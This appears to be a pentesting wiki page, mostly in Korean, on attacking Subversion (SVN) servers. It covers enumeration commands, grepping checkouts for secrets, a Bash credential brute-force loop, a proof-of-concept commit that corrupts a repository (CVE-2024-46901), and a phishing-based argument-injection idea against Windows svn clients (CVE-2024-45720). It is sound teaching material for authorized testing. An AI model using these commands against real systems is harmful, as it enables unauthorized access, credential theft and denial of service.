# 3690/tcp - Pentesting Subversion (SVN) 서버

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

**Subversion (SVN)**은 중앙 집중식 **버전 관리 시스템** (Apache 라이선스)으로 소프트웨어 버전 관리 및 이력 관리를 위해 사용됩니다.

**기본 포트:** `3690/tcp` (svnserve). 또한 `mod_dav_svn`을 통해 **HTTP/HTTPS**로 노출되거나 **svn+ssh**를 통해 노출될 수 있습니다.
```text
PORT     STATE SERVICE
3690/tcp open  svnserve Subversion
```
### Banner Grabbing
```bash
nc -vn 10.10.10.10 3690
svnserve --version           # if shell access is obtained
svn --version                # client version leak via error messages
```
## Enumeration
```bash
# Anonymous / authenticated listing
svn ls svn://10.10.10.203                  # list root
svn ls -R svn://10.10.10.203/repo         # recursive list
svn info svn://10.10.10.203/repo          # repo metadata
svn log svn://10.10.10.203/repo           # commit history
svn checkout svn://10.10.10.203/repo      # checkout repository
svn up -r 2                               # move working copy to revision 2
svn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes

# If served over HTTP(S)
svn ls https://10.10.10.10/svn/repo --username guest --password ''

# Extract revision props (often contain build creds, URLs, tokens)
svn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo
```
### 인증 및 구성 오류 탐지

- `svnserve.conf`는 `anon-access = read`(또는 심지어 쓰기 허용)로 설정되어 있을 수 있습니다. 목록을 확인할 수 있다면 `checkout`을 시도해 비밀, 스크립트, CI 토큰을 덤프하세요.
- 저장소는 버전 관리된 설정 파일에 **빌드 파이프라인**, **배포 키**, **데이터베이스 자격증명**을 자주 저장합니다. `checkout` 후 워킹 카피에서 grep 하세요: `grep -R "password\|secret\|token" -n .`.
- svn+ssh가 활성화된 경우, 사용자 셸은 종종 제한된 `svnserve` 명령을 허용합니다; 래퍼를 우회하기 위해 조작된 서브커맨드로 `ssh user@host svnserve -t`를 시도하세요.

### 자격증명 무차별 대입 (svnserve)

`sasl` 인증(활성화된 경우)과 단순한 패스워드 파일은 전송 계층에 의해서만 보호됩니다; 기본적으로 잠금(lockout) 기능이 없습니다. 간단한 Bash 루프로 자격증명을 시도할 수 있습니다:
```bash
for u in admin dev ci; do
for p in $(cat /tmp/passlist); do
svn ls --username "$u" --password "$p" svn://10.10.10.203/repo 2>/dev/null && echo "[+] $u:$p" && break
done
done
```
## 최근 취약점 (실무적 영향)

### mod_dav_svn의 제어 문자로 인한 DoS (CVE-2024-46901)

- 커밋 권한을 가진 사용자가 제어 문자(e.g. `\x01`, `\x7f`)를 포함한 경로를 기록할 수 있으며, 이는 **저장소를 손상시켜** 이후의 체크아웃/로그가 실패하고 잠재적으로 `mod_dav_svn` 워커를 크래시시킬 수 있습니다.
- Subversion ≤ **1.14.4**가 **HTTP(S)** (`mod_dav_svn`)를 통해 서비스될 때 영향을 받습니다. **1.14.5**에서 수정되었습니다.
- PoC 커밋: `svnmucc` 사용 (requires valid commit creds):
```bash
# create payload file
printf 'pwn' > /tmp/payload
# commit a path with a control character in its name
svnmucc -m "DoS" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\x01path.txt'
```
- 커밋 이후, 일반 클라이언트는 관리자가 `svnadmin dump/filter/load`로 해당 리비전을 수동으로 제거할 때까지 충돌하거나 업데이트를 거부할 수 있습니다.

### Windows argument injection in svn client (CVE-2024-45720)

- Windows에서 `svn.exe`의 "best-fit" 문자 인코딩은 특수하게 조작된 non‑ASCII 경로/URL을 처리할 때 **command-line argument injection**을 허용하여 임의의 프로그램 실행으로 이어질 수 있습니다.
- Windows에서만 Subversion ≤ **1.14.3**에 영향을 미치며, **1.14.4**에서 수정되었습니다. Attack surface: phishing a developer to run `svn` on an attacker-controlled URL/path.
- Pentest angle: Windows 개발자에게 제공되는 네트워크 공유나 ZIP을 제어할 수 있다면, repo URL이나 working-copy 경로 이름에 best-fit 바이트를 포함시켜 `" & calc.exe & "` 스타일의 인젝션 인자를 디코드하게 만든 뒤, 피해자가 해당 경로에서 `svn status` 등 명령을 실행하도록 속여 보세요.

## Notes for Exploitation Workflow

1. **Check access method**: `svn://` (svnserve), `http(s)://.../svn/` (mod_dav_svn), 또는 `svn+ssh://`.
2. 먼저 **Try anonymous read**; 그 후 common creds를 스프레이(spray)하세요. HTTP Basic이 사용되는 경우, 다른 곳에서 발견한 creds를 재사용하세요.
3. **Enumerate hooks**: `hooks/pre-commit`, `post-commit` 스크립트는 때때로 평문 자격증명이나 호스트명을 포함합니다.
4. **Leverage `svn:externals`**를 사용해 다른 호스트에서 추가 경로를 가져오세요; 체크아웃 후 `svn propget svn:externals -R .`로 나열할 수 있습니다.
5. Version leaks: `mod_dav_svn`의 HTTP 응답 헤더는 보통 Subversion 및 Apache 버전을 표시합니다; 취약 대상을 식별하려면 1.14.5와 비교하세요.
6. 레포지토리에 파일시스템 접근을 얻은 경우, `svnadmin dump`/`svnlook author`/`svnlook dirs-changed`로 자격증명 없이 오프라인 분석이 가능합니다.



## References

- [Apache Subversion security advisory CVE-2024-46901](https://subversion.apache.org/security/CVE-2024-46901-advisory.txt)
- [Apache Subversion security advisory CVE-2024-45720](https://subversion.apache.org/security/CVE-2024-45720-advisory.txt)
{{#include ../banners/hacktricks-training.md}}
